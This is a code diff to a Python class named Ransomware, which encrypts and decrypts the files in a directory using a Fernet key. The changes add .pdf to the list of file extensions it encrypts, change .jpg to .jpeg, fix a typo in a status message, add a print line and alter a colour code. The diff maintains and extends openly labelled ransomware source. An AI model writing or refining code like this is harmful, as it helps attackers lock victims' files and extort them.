@@ -79,7 +79,7 @@ class Ransomware:
 		# --> Fernet object
 		self.linear_b=None
 		# --> File extensions to encrypt
-		self.file_ext_targets=['.txt', '.jpg', '.png', '.mp3']
+		self.file_ext_targets=['.txt', '.jpeg', '.png', '.mp3', '.pdf']
 		# --> File where key is being stored if key exists in another file
 		self.keyfile=keyfile
 		# --> Directory that contains files we want to encrypt
@@ -162,6 +162,7 @@ class Ransomware:
 		print('\n')
 		for _ in tqdm(range(10000000), desc=progress_bar_info):
 			pass
+		print('\n')
 
 
 	def store_key(self):
@@ -208,7 +209,7 @@ class Ransomware:
 		'''
 		$ Encrypting all files in the directory stored in the directory variable
 		'''
-		print(f'%s[+] File to encypt --> {name_of_curr_file} %s' % (fg(9), attr(0)))
+		print(f'%s[+] File to encrypt --> {name_of_curr_file} %s' % (fg(9), attr(0)))
 
 		# --> Return the encrypted version of the contents of a file
 		return self.linear_b.encrypt(data_to_encrypt)
@@ -218,7 +219,7 @@ class Ransomware:
 		'''
 		$ Decrypt all files in the directory stored in the directory variable
 		'''
-		print(f'%s[+] File to decrypt --> {name_of_curr_file} %s' % (fg(27), attr(0)))
+		print(f'%s[+] File to decrypt --> {name_of_curr_file} %s' % (fg(123), attr(0)))
 		# --> Return the decrypted data of an encrypted file
 		return self.linear_b.decrypt(data_to_decrypt)
 
